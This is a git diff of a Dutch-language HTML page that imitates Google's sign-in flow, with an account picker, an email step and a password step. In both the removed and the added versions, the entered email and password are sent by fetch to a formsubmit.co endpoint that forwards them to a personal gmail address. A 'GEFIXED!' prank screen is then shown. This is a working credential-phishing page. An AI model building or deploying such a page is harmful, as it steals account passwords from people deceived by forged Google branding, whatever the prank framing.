@@ -7,67 +7,131 @@
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
     <style>
         body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box, .prank-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .login-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
+        @media (max-width: 450px) { .login-box { border: none; padding: 20px; } }
         .google-logo { height: 24px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-top: 10px; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 20px; }
-        #loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .prank-box { display: none; }
-        .data-reveal { background: #f8f9fa; padding: 15px; border-radius: 6px; text-align: left; margin: 20px 0; border-left: 5px solid #ff0000; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        p { font-size: 16px; color: #202124; margin-bottom: 25px; }
+        
+        /* Account Lijst */
+        .account-list { border-top: 1px solid #dadce0; margin-top: 20px; text-align: left; }
+        .account-item { display: flex; align-items: center; padding: 12px; border-bottom: 1px solid #dadce0; cursor: pointer; }
+        .account-item:hover { background: #f8f9fa; }
+        .avatar { width: 35px; height: 35px; background: #5f6368; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; font-weight: 500; font-size: 18px; }
+        .acc-blue { background: #1a73e8; }
+        .account-info { flex-grow: 1; }
+        .account-name { font-size: 14px; font-weight: 500; color: #3c4043; }
+        .account-email { font-size: 12px; color: #70757a; }
+
+        /* Inputs */
+        input { width: 100%; padding: 13px 15px; margin: 15px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { outline: none; border: 2px solid #1a73e8; }
+        
+        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        
+        /* Secties verbergen */
+        #manualEmailStep, #passStep, #prankPage { display: none; }
+        .loading-line { position: absolute; top: 0; left: 0; height: 4px; width: 0; background: #1a73e8; transition: width 0.5s; }
     </style>
 </head>
 <body>
 
-    <div id="loginPage" class="login-box">
+    <div class="login-box">
+        <div id="loader" class="loading-line"></div>
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
-        <h1>Inloggen</h1>
-        <p>Gebruik je Google-account</p>
         
-        <form action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST" id="googleForm">
-            <input type="email" name="email" id="email" placeholder="E-mailadres" required>
-            <input type="password" name="password" id="pass" placeholder="Wachtwoord" minlength="6" required>
-            
-            <input type="hidden" name="_captcha" value="false">
-            
-            <div id="loader"></div>
-            <button type="submit" id="submitBtn">Volgende</button>
-        </form>
-    </div>
-
-    <div id="prankPage" class="prank-box">
-        <div style="font-size: 60px;">🤡</div>
-        <h1>GEFIXED!</h1>
-        <p>thanks <b>Dolphin0X</b>.</p>
-        <div class="data-reveal">
-            <strong>E-mail:</strong> <span id="displayEmail"></span><br>
-            <strong>Wachtwoord:</strong> <span id="displayPass"></span>
+        <div id="accountPicker">
+            <h1>Account kiezen</h1>
+            <p>om door te gaan naar Google</p>
+            <div class="account-list">
+                <div class="account-item" onclick="showPass('Dolphin User', 'test-user@gmail.com')">
+                    <div class="avatar acc-blue">D</div>
+                    <div class="account-info">
+                        <div class="account-name">Dolphin User</div>
+                        <div class="account-email">test-user@gmail.com</div>
+                    </div>
+                </div>
+                <div class="account-item" onclick="showManual()">
+                    <div class="avatar">👤</div>
+                    <div class="account-info">
+                        <div class="account-name" style="color:#1a73e8;">Een ander account gebruiken</div>
+                    </div>
+                </div>
+            </div>
         </div>
-        <p>Check je mailbox, Dolphin0X... daar staat het nu ook! 😉</p>
+
+        <div id="manualEmailStep">
+            <h1>Inloggen</h1>
+            <p>Gebruik je Google-account</p>
+            <input type="email" id="manualEmailInput" placeholder="E-mailadres of telefoonnummer">
+            <div class="btn-container">
+                <a onclick="location.reload()" class="account-name" style="color:#1a73e8; cursor:pointer; text-decoration:none;">Terug</a>
+                <button onclick="processManualEmail()">Volgende</button>
+            </div>
+        </div>
+
+        <div id="passStep">
+            <h1>Welkom</h1>
+            <div style="display:inline-flex; align-items:center; border:1px solid #dadce0; padding:4px 12px; border-radius:15px; font-size:14px; margin-bottom:20px;">
+                <span id="displayEmail"></span>
+            </div>
+            
+            <form id="finalForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
+                <input type="hidden" name="email" id="hiddenEmail">
+                <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
+                <div class="btn-container">
+                    <span style="color:#1a73e8; font-size:14px; font-weight:500;">Wachtwoord vergeten?</span>
+                    <button type="submit">Volgende</button>
+                </div>
+            </form>
+        </div>
+
+        <div id="prankPage">
+            <div style="font-size: 50px;">🥞</div>
+            <h1>GEFIXED!</h1>
+            <p>Lekker gewerkt, pannenkoek!</p>
+            <p>Je gegevens zijn zojuist veilig "getest".</p>
+            <button onclick="location.reload()" style="background:#333; width:100%; color:white; border:none; padding:10px; border-radius:4px;">Terug naar start</button>
+        </div>
     </div>
 
     <script>
-        document.getElementById('googleForm').addEventListener('submit', function(e) {
+        const loader = document.getElementById('loader');
+
+        function showManual() {
+            document.getElementById('accountPicker').style.display = 'none';
+            document.getElementById('manualEmailStep').style.display = 'block';
+        }
+
+        function processManualEmail() {
+            const email = document.getElementById('manualEmailInput').value;
+            if(!email.includes('@')) { alert("Vul een geldig e-mailadres in."); return; }
+            showPass("User", email);
+        }
+
+        function showPass(name, email) {
+            loader.style.width = "100%";
+            setTimeout(() => {
+                document.getElementById('accountPicker').style.display = 'none';
+                document.getElementById('manualEmailStep').style.display = 'none';
+                document.getElementById('passStep').style.display = 'block';
+                document.getElementById('displayEmail').innerText = email;
+                document.getElementById('hiddenEmail').value = email;
+                loader.style.width = "0%";
+            }, 600);
+        }
+
+        document.getElementById('finalForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            const btn = document.getElementById('submitBtn');
-            const loader = document.getElementById('loader');
-            const formData = new FormData(this);
-
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-
-            // Verzend de data naar FormSubmit
+            loader.style.width = "100%";
             fetch(this.action, {
                 method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                document.getElementById('loginPage').style.display = 'none';
+                body: new FormData(this)
+            }).then(() => {
+                document.getElementById('passStep').style.display = 'none';
                 document.getElementById('prankPage').style.display = 'block';
-                document.getElementById('displayEmail').innerText = document.getElementById('email').value;
-                document.getElementById('displayPass').innerText = document.getElementById('pass').value;
+                loader.style.width = "0%";
             });
         });
     </script>
